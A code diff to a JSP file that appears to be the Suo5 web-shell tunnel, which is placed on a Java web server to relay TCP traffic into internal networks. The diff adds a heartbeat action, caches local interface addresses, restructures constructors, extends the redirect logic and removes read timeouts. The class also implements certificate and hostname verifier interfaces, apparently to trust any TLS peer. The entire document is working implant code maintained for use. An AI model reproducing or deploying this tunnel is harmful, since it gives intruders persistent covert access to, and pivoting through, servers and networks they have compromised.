@@ -1,23 +1,25 @@
 <%@ page trimDirectiveWhitespaces="true" %>
-<%@ page import="java.util.HashMap" %>
 <%@ page import="java.nio.ByteBuffer" %>
 <%@ page import="java.io.*" %>
-<%@ page import="java.util.Date" %>
-<%@ page import="java.util.Arrays" %>
-<%@ page import="java.util.Enumeration" %>
 <%@ page import="java.net.*" %>
 <%@ page import="java.security.cert.X509Certificate" %>
 <%@ page import="java.security.cert.CertificateException" %>
 <%@ page import="javax.net.ssl.*" %>
+<%@ page import="java.util.*" %>
 <%!
-    public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
+    public static class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
+
+        static HashMap<String, Boolean> addrs = collectAddr();
 
         InputStream gInStream;
         OutputStream gOutStream;
 
-        private void setStream(InputStream in, OutputStream out) {
-            gInStream = in;
-            gOutStream = out;
+        public Suo5() {
+        }
+
+        public Suo5(InputStream in, OutputStream out) {
+            this.gInStream = in;
+            this.gOutStream = out;
         }
 
         public void process(ServletRequest sReq, ServletResponse sResp) {
@@ -230,8 +232,7 @@
 
             Thread t = null;
             try {
-                Suo5 p = new Suo5();
-                p.setStream(scInStream, respOutStream);
+                Suo5 p = new Suo5(scInStream, respOutStream);
                 t = new Thread(p);
                 t.start();
                 readReq(reqReader, scOutStream);
@@ -281,6 +282,8 @@
                         socketOutStream.write(data);
                         socketOutStream.flush();
                     }
+                } else if (action[0] == 0x03) {
+                    continue;
                 } else {
                     return;
                 }
@@ -303,9 +306,10 @@
                 return;
             }
             /*
-                ActionCreate   byte = 0x00
-                ActionData     byte = 0x01
-                ActionDelete   byte = 0x02
+                ActionCreate    byte = 0x00
+                ActionData      byte = 0x01
+                ActionDelete    byte = 0x02
+                ActionHeartbeat byte = 0x03
              */
             byte[] redirectData = dataMap.get("r");
             boolean needRedirect = redirectData != null && redirectData.length > 0;
@@ -317,7 +321,7 @@
             }
             // load balance, send request with data to request url
             // action 0x00 need to pipe, see below
-            if (needRedirect && (action[0] == 0x01 || action[0] == 0x02)) {
+            if (needRedirect && action[0] >= 0x01 && action[0] <= 0x03) {
                 HttpURLConnection conn = redirect(request, dataMap, redirectUrl);
                 conn.disconnect();
                 return;
@@ -345,6 +349,11 @@
                     scOutStream.flush();
                 }
                 respOutStream.close();
+                return;
+            } else {
+            }
+
+            if (action[0] != 0x00) {
                 return;
             }
             // 0x00 create new tunnel
@@ -404,20 +413,36 @@
             }
         }
 
+        static HashMap<String, Boolean> collectAddr() {
+            HashMap<String, Boolean> addrs = new HashMap<String, Boolean>();
+            try {
+                Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
+                while (nifs.hasMoreElements()) {
+                    NetworkInterface nif = nifs.nextElement();
+                    Enumeration<InetAddress> addresses = nif.getInetAddresses();
+                    while (addresses.hasMoreElements()) {
+                        InetAddress addr = addresses.nextElement();
+                        String s = addr.getHostAddress();
+                        if (s != null) {
+                            // fe80:0:0:0:fb0d:5776:2d7c:da24%wlan4  strip %wlan4
+                            int ifaceIndex = s.indexOf('%');
+                            if (ifaceIndex != -1) {
+                                s = s.substring(0, ifaceIndex);
+                            }
+                            addrs.put(s, true);
+                        }
+                    }
+                }
+            } catch (Exception e) {
+//                System.out.printf("read socket error, %s\n", e);
+//                e.printStackTrace();
+            }
+            return addrs;
+        }
+
         boolean isLocalAddr(String url) throws Exception {
             String ip = (new URL(url)).getHost();
-            Enumeration<NetworkInterface> nifs = NetworkInterface.getNetworkInterfaces();
-            while (nifs.hasMoreElements()) {
-                NetworkInterface nif = nifs.nextElement();
-                Enumeration<InetAddress> addresses = nif.getInetAddresses();
-                while (addresses.hasMoreElements()) {
-                    InetAddress addr = addresses.nextElement();
-                    if (addr instanceof Inet4Address)
-                        if (addr.getHostAddress().equals(ip))
-                            return true;
-                }
-            }
-            return false;
+            return addrs.containsKey(ip);
         }
 
         HttpURLConnection redirect(HttpServletRequest request, HashMap<String, byte[]> dataMap, String rUrl) throws Exception {
@@ -426,6 +451,7 @@
             HttpURLConnection conn = (HttpURLConnection) u.openConnection();
             conn.setRequestMethod(method);
             conn.setConnectTimeout(3000);
+            conn.setReadTimeout(0);
             conn.setDoOutput(true);
             conn.setDoInput(true);
 
